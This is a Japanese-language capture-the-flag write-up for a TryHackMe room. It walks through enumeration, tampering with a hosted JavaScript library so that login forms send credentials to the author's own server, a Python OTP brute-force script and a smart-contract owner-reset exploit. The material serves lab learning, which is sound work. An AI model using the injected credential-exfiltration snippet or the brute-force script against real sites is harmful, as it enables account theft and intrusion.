# TryHack3M: TriCipher Summit CTF

https://tryhackme.com/room/tryhack3mencryptionchallenge

## Enumeration

```shell
TARGET=10.48.150.93
sudo bash -c "echo $TARGET   3m.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE         REASON
22/tcp   open  ssh             syn-ack ttl 64
80/tcp   open  http            syn-ack ttl 64
443/tcp  open  https           syn-ack ttl 63
5000/tcp open  upnp            syn-ack ttl 64
8000/tcp open  http-alt        syn-ack ttl 63
9444/tcp open  wso2esb-console syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,80,443,5000,8000,9444 $TARGET

PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http             WebSockify Python/3.8.10
443/tcp  open  ssl/http         nginx 1.25.4
5000/tcp open  ssl/upnp?
8000/tcp open  http             nginx 1.25.4
9444/tcp open  wso2esb-console?
```

- 80 GETが非サポート。
- 443 HTTPS 証明書に表示されていたドメイン名 `cdn.tryhackm3.loc`。/ui に管理画面があるというヒントがあり、アクセスしたら S3 ninja の画面。  
- 5000 TCP接続はできるが不明。
- 8000,9444 443ポートと同じ内容が表示されている。

## S3 ninja

```
Version: 8.3.3, Build: 433 (2024-02-14 10:40)
```

脆弱性を検索したが特にない。

```
Storage Path
/home/sirius/data (Free: 31.24 GB)
Access Key
AKIAIOSFODNN7EXAMPLE
Secret Key
wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

公開Bucketには2ファイル含まれていた。下記の差分以外は同じ内容。

```sh
$ diff ./auth.js form-submit.js                 
112,120d111
<     try {
<             const oReq = new XMLHttpRequest();            
<             oReq.open("GET", "http://10.11.9.173:7070/item?" + rawdata);
<             oReq.send();
<         }
<         catch(err) {
<             console.log(err);
<         }
< 
```

コマンドを実行すると、9444でのみ認証エラーにならなかった。

```sh
$ aws --endpoint-url http://3m.thm:8000 s3 ls s3://bucket --profile m3 

aws: [ERROR]: An error occurred (SignatureDoesNotMatch) when calling the ListObjectsV2 operation: The computed request signature does not match the one provided. Check login credentials. (Expected: 75d1769553ff613285e0d2f9b3ea945259b7de44d2ee3953958331417c2be87f, Found: 60bfbd22b58d253a25fa5eafc4ada22d279c9ba3a17c07d2071963f28da5ec14)

Additional error details:
Resource: /bucket
```                                                                                                                   
```sh
$ aws --endpoint-url http://3m.thm:9444 s3 ls s3://bucket --profile m3

aws: [ERROR]: An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: Bucket does not exist

Additional error details:
Resource: /bucket
```

ブラウザから見えていたものと同じ。

```sh
$ aws --endpoint-url http://3m.thm:9444 s3 ls --profile m3
2024-04-05 06:23:05 libraries

$ aws --endpoint-url http://3m.thm:9444 s3 ls s3://libraries --profile m3
2024-04-04 16:23:32       4910 auth.js
2024-04-05 06:23:05       4671 form-submit.js
```

本物のS3ではないので、バージョニングは無い。

```sh
$ aws --endpoint-url http://3m.thm:9444 s3api list-object-versions --bucket libraries --profile m3

aws: [ERROR]: An error occurred (InvalidRequest) when calling the ListObjectVersions operation: Received unknown query 'versions'.

Additional error details:
Resource: /libraries
```

ログイン画面がどこにあるのか分からないが、この部分を自分のIPアドレスに変えたら、認証情報を送信させることができるのでは？

```js
<     try {
<             const oReq = new XMLHttpRequest();            
<             oReq.open("GET", "http://10.11.9.173:7070/item?" + rawdata);
<             oReq.send();
<         }
<         catch(err) {
<             console.log(err);
<         }
< 
```

form-submit.jsを変更してアップロードした。更新はできたが、リクエストが来ない。  
auth.js でも同様。

```sh
$ aws --endpoint-url http://3m.thm:9444 s3 cp form-submit.js s3://libraries/form-submit.js --profile m3
upload: ./form-submit.js to s3://libraries/form-submit.js 
```

5000ポートにHTTPS接続したらログイン画面が表示された。

```html
<script src="https://cdn.tryhackm3.loc/libraries/form-submit.js"></script>
```

ブラウザ上でログイン操作したところ、下記のログが出力された。HTTPSでないためブロックされていたことが分かった。

```txt
form-submit.js:116 Mixed Content: The page at 'https://10.48.144.4:5000/' was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint 'http://192.168.129.39/item?username=thm&password=thm'. This request has been blocked; the content must be served over HTTPS.
```

HTTPSサーバー起動

```sh
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);ssl_context.load_cert_chain(certfile='localhost.pem', keyfile='localhost.pem');httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True);httpd.serve_forever()"
```

リクエストが来た。

```sh
10.48.144.4 - - [24/Mar/2026 04:31:43] code 404, message File not found
10.48.144.4 - - [24/Mar/2026 04:31:43] "GET /item?username=TryHackM3&password=supersecretpassword HTTP/1.1" 404 -
```

ログインしたら下記表示。APIが何を指しているのか分からない。

```
Congrats if you got here for the right reasons, check the responses of the API requests for more information!
```

## /login

dirbでディレクトリ検索したら、/login を発見。405でGETが許可されていない。これがAPIの意味するところだと思われる。

```sh
---- Scanning URL: https://cdn.tryhackm3.loc:5000/ ----
+ https://cdn.tryhackm3.loc:5000/login (CODE:405|SIZE:153)  
```

POSTでBadRequestになった。

```sh
$ curl -X POST -k https://tryhackm3.loc:5000/login -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=TryHackM3&password=supersecretpassword' 
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>
```

auth.js の実装を思い出した。

```js
    const rawAesKey = window.crypto.getRandomValues(new Uint8Array(16));
    let mac = rot13(window.btoa(String.fromCharCode(...rawAesKey)))
    const aesKey = await getSecretKey(rawAesKey)
    const rsaKey = await getPrivateKey()
    let rawdata = "username=" + formDataObj["username"] + "&password=" + formDataObj["password"]
    let data = window.btoa(String.fromCharCode(...new Uint8Array(await encryptMessage(aesKey, enc.encode(rawdata).buffer))))
    let sign = window.btoa(String.fromCharCode(...new Uint8Array(await signMessage(rsaKey, enc.encode(rawdata).buffer))))

    const response = await fetch('/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
        },
        body: "mac=" + encodeURIComponent(mac) + "&data=" + encodeURIComponent(data) + "&sign=" + encodeURIComponent(sign)
    });
    if (response.ok && response.status == 200 && (await response.text()).startsWith("result=")) {
        window.location.href = '/congratulations';
    } else {
        alert('Login failed');
    }
```

mac, data, sign のパラメータを送る必要がある。  
暗号を解析する必要はなく、javascriptを改造して実行するだけで値は分かる。


```sh
$ curl -X POST -k https://tryhackm3.loc:5000/login -H 'Content-Type: application/x-www-form-urlencoded' -d 'mac=UFbeBTX0[REDACTED]&data=12s390LEYnuh3o[REDACTED]&sign=rAviVL7pDXKVylS[REDACTED]'
result=Q29uZ3J[REDACTED]
```

Base64デコード

```sh
Congratulations, you got the username and password, now provide the OTP at /supersecretotp. Flag1: THM{[REDACTED]}7
```

## /supersecretotp

OTP送信画面が表示された。

```html
    <!--<script src="https://cdn.tryhackm3.loc/libraries/form-submit.js"></script>/-->
    <script src="static/form-submit2.js"></script>
```

form-submit2.js

```js
    const rawAesKey = window.crypto.getRandomValues(new Uint8Array(16));
    let mac = rot13(window.btoa(String.fromCharCode(...rawAesKey)))
    const aesKey = await getSecretKey(rawAesKey)
    const rsaKey = await getPrivateKey()
    let rawdata = "otp=" + formDataObj["otp"]
    let data = window.btoa(String.fromCharCode(...new Uint8Array(await encryptMessage(aesKey, enc.encode(rawdata).buffer))))
    let sign = window.btoa(String.fromCharCode(...new Uint8Array(await signMessage(rsaKey, enc.encode(rawdata).buffer))))

    const response = await fetch('/supersecretotp', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
        },
        body: "mac=" + encodeURIComponent(mac) + "&data=" + encodeURIComponent(data) + "&sign=" + encodeURIComponent(sign)
    });
    if (response.ok && response.status == 200 && (await response.text()).startsWith("result=")) {
        window.location.href = '/activated';
    } else {
        alert('OTP failed, for more information review the result of the API');
    }
```

試しに 1111 を送ったら、下記の結果が返ってきた。

```
result=bsUmnNNlBfqQJaoaHflKbJSr4PRqqWdhWGBGzMsvTe4%3D
```

このときのリクエスト

```
mac: /4OwP+fzlc002Z48SKNjGD==
data: e89G4z9UdrJoUeMOSekclw==
sign: m/5qmTyhruum3CFjxeNfHo/rI7m68FOzaBILso67yvkdsVcqO1JUpEIr4gbhPUF6nKLR5BJkAvpoHlQiGUwir3UyaChCA/tsaF7+GmNyYF+1sUXciatlbvaI8piF1uV7NwRv3mil41B6nHR+Z2711KTIv5HLQJKHXPnUgZSeUy4hqho3cpzmhp0tES2q2gTkbUF7LOePbPZRGdUdZx3bd93QLPGySCth3tU/xidxniHgGHQ7uupp8DfGN+yfhu1nl/TAhaPknXKwg8DpGE8SMPG4olyGBr8Elw9c6R9eihk8uyQmwIfxP97V8xTnGwYKCvjtDmBQXZQ1QbxiX+6y+A==
```

OTPの桁数などの制約が分かればブルートフォースもできそうだが、不明なのでこの暗号の解読を目指す。

auth.js と form-submit2.js の diff をとると、鍵などは変わっていないことが分かる。また、auth.js には復号関数があるのでそのまま使えそう。

```sh
$ diff ./auth.js form-submit2.js 
1c1
< const form = document.querySelector('#login-form');
---
> const form = document.querySelector('#otp-form');
81,92d78
< async function decryptMessage(key, message) {
<     iv = enc.encode("0000000000000000").buffer;
<     return await window.crypto.subtle.decrypt(
<       {
<         name: "AES-CBC",
<         iv
<       },
<       key,
<       message
<     );
< }
< 
113c99
<     let rawdata = "username=" + formDataObj["username"] + "&password=" + formDataObj["password"]
---
>     let rawdata = "otp=" + formDataObj["otp"]
117c103
<     const response = await fetch('/login', {
---
>     const response = await fetch('/supersecretotp', {
125c111
<         window.location.href = '/congratulations';
---
>         window.location.href = '/activated';
127c113
<         alert('Login failed');
---
>         alert('OTP failed, for more information review the result of the API');
```

macを使って復号する処理

```js
const targetMac = "/4OwP+fzlc002Z48SKNjGD==";
const targetData = "bsUmnNNlBfqQJaoaHflKbJSr4PRqqWdhWGBGzMsvTe4=";

const base64Key = rot13(targetMac);
const rawKeyBuffer = str2ab(window.atob(base64Key));
const aesKey = await getSecretKey(rawKeyBuffer);

try {
    const encryptedBuffer = str2ab(window.atob(targetData));
    const decryptedBuffer = await decryptMessage(aesKey, encryptedBuffer);
    
    const result = new TextDecoder().decode(decryptedBuffer);
    console.log("復号結果:", result);
} catch (e) {
    console.error("復号失敗", e);
}
```

復号結果は次のようになった。1111ではなく2222を送っても全く同じ結果だった。

```sh
復号結果: OTP is not `1313`
```

4桁のブルートフォースをするしかないと思われる。

```python
import requests
import base64
import codecs
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad

# --- 設定項目 ---
TARGET_URL = "https://tryhackm3.loc:5000/supersecretotp"
FIXED_MAC = "Nv6+uXh7FOUbmpnDU6aUGj=="
PRIV_KEY_PEM = """-----BEGIN RSA PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCuL9Yb8xsvKimy
lR/MJB2Z2oBXuIvIidHIVxf7+Sl3Y35sU53Vd+D1QOuJByvpLmpczYsQkUMJmKha
[REDACTED]
-----END RSA PRIVATE KEY-----"""

def solve():
    # 1. MACからAES鍵を復元 (ROT13 -> Base64 Decode)
    raw_b64_key = codecs.encode(FIXED_MAC, 'rot_13')
    aes_key_bytes = base64.b64decode(raw_b64_key)
    
    # RSA秘密鍵の準備
    rsa_key = RSA.import_key(PRIV_KEY_PEM)
    iv = b"0000000000000000"

    for i in range(10000):
        otp = f"{i:04d}" # 0000, 0001...
        raw_data = f"otp={otp}".encode('utf-8')

        # --- AES暗号化 ---
        cipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv=iv)
        # Web CryptoのAES-CBCはPKCS7パディングを使用
        encrypted_bytes = cipher.encrypt(pad(raw_data, AES.block_size))
        data_param = base64.b64encode(encrypted_bytes).decode('utf-8')

        # --- RSA署名 ---
        h = SHA256.new(raw_data)
        signature = pkcs1_15.new(rsa_key).sign(h)
        sign_param = base64.b64encode(signature).decode('utf-8')

        # --- POSTリクエスト ---
        payload = {
            "mac": FIXED_MAC,
            "data": data_param,
            "sign": sign_param
        }
        
        try:
            response = requests.post(TARGET_URL, data=payload, verify=False)
            
            if response.status_code == 200:
                content = response.text
                if content.startswith("result="):
                    print(f"\n[+] Success! OTP: {otp}")
                    with open("response.txt", "w", encoding="utf-8") as f:
                        f.write(content)
                    return
            
            if i % 100 == 0:
                print(f"Checked {i}...", end="\r")

        except Exception as e:
            print(f"\n[!] Error at OTP {otp}: {e}")
            break

if __name__ == "__main__":
    solve()
```

結果・・・、これは相当意地が悪い。

```sh
[+] Success! OTP: 1313
```

このときのResultを復号すると次の形に。

```sh
復号結果: Congratulations, you cracked the OTP, the ledger is now active, please visit port 3000! Flag2: THM{[REDACTED]}
```

3000ポートにHTTP接続。

## Blockchain Challenge

目標は、isSolved() が true を返す状態にすること。

```
Goal: have the isSolved() function return true

Player Balance: 1.0 ETH
Player Wallet Address: 0xB48f37688d8154B401c7628348edd6b74D650fC1
Private Key: 0x000e2ffbf7dc[REDACTED]
Contract Address: 0xf22cB0Ca047e88AC996c17683Cee290518093574
Block Time: 0
RPC URL: http://geth:8545
Chain ID: 31337
```

表示されていたスマートコントラクトのコード。

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    address public owner;
    address public deposit;
    uint256 public constant INITIAL_BALANCE = 3000000;
    bool public you_solved_it = false;

    constructor() {
        deposit = msg.sender;
        owner = msg.sender;
        balances[owner] = INITIAL_BALANCE;
    }

    mapping(address => uint256) public balances;

    function getOwnerBalance() external view returns (uint256) {
        return balances[owner];
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can transfer the balance");
        _;
    }

    function transferDeposit() onlyOwner external {

        

        uint256 ownerBalance = balances[deposit];
        require(ownerBalance > 0, "Owner has no balance to transfer");

        balances[deposit] = 0;
        balances[owner] += ownerBalance;
        you_solved_it = true;       
    }

    function getBalanceFromAddress(address _address) external returns (uint256) {


       return balances[_address];
    }
   
    function reset(address resetAddress) external  {
        require(resetAddress != address(0), "Invalid address");
        owner = resetAddress;
    }

     function isSolved() external view returns (bool) {
           return you_solved_it;
           
    }

}
```

- transferDeposit() を実行できれば勝ちだが、senderとownerが同一であるかのチェックがある
- reset() を実行したら、owner を引数で渡した値に変更できる。

```sh
$ PRIVATE_KEY=0x000e2ffbf7dc[REDACTED]
CONTRACT_ADDRESS=0xf22cB0Ca047e88AC996c17683Cee290518093574
PLAYER_ADDRESS=0xB48f37688d8154B401c7628348edd6b74D650fC1
RPC_URL=http://geth:8545
```

reset 実行成功。

```sh
$ reset=`cast send $CONTRACT_ADDRESS "reset(address)" $PLAYER_ADDRESS --rpc-url ${RPC_URL} --private-key ${PRIVATE_KEY} --legacy`
echo $reset

blockHash            0x42bcb79eec4218596550067b6a5bcaa916c94d6b750be8f415c84f954084164b
blockNumber          3
contractAddress      
cumulativeGasUsed    27603
effectiveGasPrice    1000000000
from                 0xB48f37688d8154B401c7628348edd6b74D650fC1
gasUsed              27603
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x4bedd452daf98ef9005ef1bc93aedf5241f5292d4591216410811d6c49118ddb
transactionIndex     0
type                 0
blobGasPrice         
blobGasUsed          
to                   0xf22cB0Ca047e88AC996c17683Cee290518093574
```

transfer成功。

```sh
$ transfer=`cast send $CONTRACT_ADDRESS "transferDeposit()" --rpc-url ${RPC_URL} --private-key ${PRIVATE_KEY} --legacy`
echo $transfer

blockHash            0x5cd98133d66d4c8360cd5c0792bd41b39d285dd841e4b2dd6df9ce6ea74296f5
blockNumber          4
contractAddress      
cumulativeGasUsed    42309
effectiveGasPrice    1000000000
from                 0xB48f37688d8154B401c7628348edd6b74D650fC1
gasUsed              42309
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0xf4600c559a7148d47378325c23e1f12ce78525530f1edcfd50813b059478e311
transactionIndex     0
type                 0
blobGasPrice         
blobGasUsed          
to                   0xf22cB0Ca047e88AC996c17683Cee290518093574
```

Get Flag ボタンを押して最後のフラグを入手成功。

## 振り返り

- HTTPで無応答、HTTPSで表示できるというパターンがあると初めて気づいた。そこに最初から気づいていたら、サプライチェーン攻撃がもっとスムーズにできたと思う。
- OTPの暗号に関しては意地が悪いと感じたが、具体的な数字が出てきた以上は一度入力してみるべきだった。
- スマートコントラクトをCTFで見たのは2回目で、今回は非常にスムーズにクリアできてうれしかった。

## Tags

#tags:AWS #tags:Crypto #tags:スマートコントラクト
